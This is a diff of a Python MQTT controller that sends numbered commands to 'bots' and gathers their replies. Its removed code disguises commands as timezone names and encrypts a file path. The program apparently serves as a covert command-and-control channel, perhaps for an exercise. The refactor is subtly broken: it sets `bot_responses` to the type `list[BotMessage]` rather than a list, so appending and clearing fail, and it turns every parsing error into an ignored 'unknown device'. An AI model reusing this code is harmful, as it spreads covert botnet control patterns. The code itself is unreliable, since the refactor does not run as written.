@@ -8,7 +8,7 @@ import json
 import time
 
 response_lock = threading.Lock()
-bot_responses = []
+bot_responses = list[BotMessage]
 
 def on_connect(client, userdata, flags, reason_code, properties):
     # reason_code - connection result code. 0 - success, otherwise failure.
@@ -25,48 +25,20 @@ def on_connect(client, userdata, flags, reason_code, properties):
 def on_message(client, userdata, msg):
     try:
         payload = msg.payload.decode()
-        data = decode_response(payload)
+        request_msg = decode_payload(payload)
 
-        with response_lock:
-            bot_responses.append(data)
+        try:
+            data = BotMessage.from_request(request_msg)
+            print(f"Deserialized payload: {request_msg}")
+            with response_lock:
+                bot_responses.append(data)
+        except Exception:
+            raise UnknownDeviceError()
 
     except UnknownDeviceError:
         pass  # Ignore messages from unknown devices
     except Exception as ex:
-        print(f"Failed to handle message: {ex}")
-
-
-def decode_response(payload: str):
-    try:
-        data = json.loads(payload)
-        result = {}
-        message = ""
-        bot_id = ""
-
-        if MSG_FIELD_BOT_ID in data:
-            # this field means bot id
-            bot_id = data[MSG_FIELD_BOT_ID]
-
-        if MSG_FIELD_ENCRYPTED_MSG in data:
-            # if field present, it contains encrypted message
-            encrypted_msg = data[MSG_FIELD_ENCRYPTED_MSG]
-            decrypted_msg = do_very_strange_decryption(encrypted_msg)
-            message += f"{decrypted_msg}"
-
-        elif MSG_FIELD_TIMEZONES in data:
-            # if field present, every timezone in list is mapped to character A-Z
-            message += decode_as_timezones(data[MSG_FIELD_TIMEZONES])
-
-        if not message and not bot_id:
-            raise UnknownDeviceError
-
-        result["bot_id"] = bot_id
-        result["message"] = message
-        return result
-    except UnknownDeviceError as ude:
-        raise ude
-    except Exception:
-        raise Exception(f"Invalid payload {payload}.")
+        print(f"Error processing message: {ex}")
 
 
 def timezone_date_time(timezone: str):
@@ -78,26 +50,16 @@ def timezone_date_time(timezone: str):
         return now_utc
 
 
-def publish_action_call(client: mqtt.Client, action_number: int, path: str = None):
-    if action_number not in COMMAND_TO_TIMEZONE:
-        print(f"Timezone is missing for action number {action_number}")
-        raise Exception(f"Timezone is missing for action number {action_number}")
+def publish_action_request(client: mqtt.Client, user_action: int, path: str = None):
+    response = RequestMessage()
 
-    action_as_timezone = COMMAND_TO_TIMEZONE[action_number]
-    dt = timezone_date_time(action_as_timezone)
-    
-    msg = {
-        MSG_FIELD_ACTION: action_as_timezone,
-        "datetime": dt.isoformat()
-    }
-
-    if path is not None:
-        msg[MSG_FIELD_ENCRYPTED_MSG] = do_very_strange_encryption(path)
+    response.set_user_action(user_action)
+    response.set_message(path)
 
     with response_lock:
         bot_responses.clear()
 
-    client.publish(MQTT_TOPIC, json.dumps(msg))
+    client.publish(MQTT_TOPIC, response.to_json())
 
 
 def wait_for_responses(timeout=5):
@@ -134,7 +96,7 @@ def user_actions(client: mqtt.Client):
                     continue
 
             if action in COMMAND_TO_TIMEZONE:
-                publish_action_call(client, int(action), path)
+                publish_action_request(client, int(action), path)
                 wait_for_responses()
             elif action.upper() == "Q":
                 print("Quitting...")
